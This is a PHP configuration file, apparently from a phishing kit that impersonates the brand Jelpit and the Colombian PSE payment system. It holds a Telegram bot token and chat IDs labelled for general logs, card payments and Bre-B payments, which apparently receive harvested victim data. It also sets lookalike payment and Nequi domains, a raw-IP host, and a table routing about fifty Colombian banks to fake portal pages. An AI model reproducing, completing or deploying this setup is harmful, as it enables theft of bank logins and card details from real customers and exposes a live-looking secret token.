<?php
// =====================================================
// Configuración Jelpit — edita sólo este archivo
// =====================================================
require_once __DIR__ . '/ban_check.php';

// ── Telegram ──────────────────────────────────────────
define('TG_TOKEN', '8840764725:AAGpJvwQ-BedbwvKzObO00RoUKU8TkBKFQo');
define('TG_CHAT', '-4955190747');   // Chat principal (logs generales) 
define('TG_CHAT_CC', '-5235238333');  // Chat pagos con tarjeta
define('TG_CHAT_BREB', '-5102130358');  // Chat pagos Bre-B

//define('TG_CHAT', '235905376');   // Chat principal (logs generales) 
//define('TG_CHAT_CC', '-5235238333');   // Chat pagos con tarjeta


// ── PSE ───────────────────────────────────────────────
define('PSE_BASE', 'https://pagosonline-pse.vercel.app');
define('RECAUDOFALL_BASE', 'https://recaudofall.94.250.202.215.nip.io/nequi');
define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#8jiyMZckw4E2nYA6');

// Bancos existentes → vercel (/sites/{slug}/manager/{id})
$PSE_BANKS = [
    'bancolombia' => ['slug' => 'bc', 'id' => '109'],
    'bogota' => ['slug' => 'bg', 'id' => '109'],
    'nequi' => ['slug' => 'nq', 'id' => '109'],
    'popular' => ['slug' => 'pop', 'id' => '109'],
    'avvillas' => ['slug' => 'avv', 'id' => '109'],
    'occidente' => ['slug' => 'occ', 'id' => '109'],
];

// Bancos → recaudofall (código exacto del parámetro &banco=)
$PSE_BANKS_RECAUDOFALL = [
    'bancolombia' => 'BANCOLOMBIA',
    'nequi' => 'NEQUI',
    'davivienda' => 'DAVIVIENDA',
    'daviplata' => 'DAVIPLATA',
    'bbva' => 'BBVA',
    'bogota' => 'BOGOTA',
    'caja-social' => 'CAJASOCIAL',
    'colpatria' => 'COLPATRIA',
    'davibank-s.a.' => 'COLPATRIA',
    'itau' => 'ITAU',
    'falabella' => 'FALABELLA',
    'occidente' => 'OCCIDENTE',
    'popular' => 'POPULAR',
    'coopcentral' => 'COOPCENTRAL',
    'bancoomeva' => 'BANCOOMEVA',
    'gnb' => 'GNB',
    'agrario' => 'AGRARIO',
    'rappipay' => 'RAPPIPAY',
    'lulo' => 'LULO',
    'bancamia' => 'BANCAMIA',
    'movii' => 'MOVII',
    'confiar' => 'CONFIAR',
    'pichincha' => 'PICHINCHA',
    'serfinanza' => 'SERFINANZA',
    'cfa' => 'ANTIOQUIA',
    'union' => 'BANCOUNIN',
    'citibank' => 'CITIBANK',
    'finandina' => 'FINANDINA',
    'iris' => 'IRIS',
    'coofinep' => 'COOFINEP',
    'credifinanciera' => 'CREDIFINANCIERA',
    'santander' => 'SANTANDER',
    'coltefinanciera' => 'COLTEFINANCIERA',
    'cotrafa' => 'COTRAFA',
    'nu' => 'NU',
    'uala' => 'UAL',
    'alianza' => 'ALIANZA',
    'jpmorgan' => 'MORGAN',
    'mundo-mujer' => 'MUNDOMUJER',
    'crezcamos' => 'CREZCAMOS',
    'dale' => 'DALE',
    'jfk' => 'JFK',
    'bold' => 'BOLD',
    'juriscoop' => 'JURISCOOP',
    'powwi' => 'POWWI',
    'coink' => 'COINK',
    'ding' => 'DING',
    'global66' => 'GLOBAL66',
];
